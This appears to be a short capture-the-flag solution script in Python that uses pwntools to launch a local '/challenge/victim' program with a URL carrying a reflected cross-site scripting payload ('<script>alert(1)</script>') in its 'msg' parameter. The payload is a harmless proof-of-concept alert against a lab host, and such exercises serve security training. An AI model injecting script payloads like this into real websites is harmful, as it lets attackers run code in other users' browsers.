#!/usr/bin/python3
import sys
import requests
from urllib.parse import quote,urlencode
from pwn import *

url = "http://challenge.localhost/"

context.log_level = 'error'

res = process(['/challenge/victim','http://challenge.localhost/?msg=<script>alert(1)</script>'])

res.interactive()
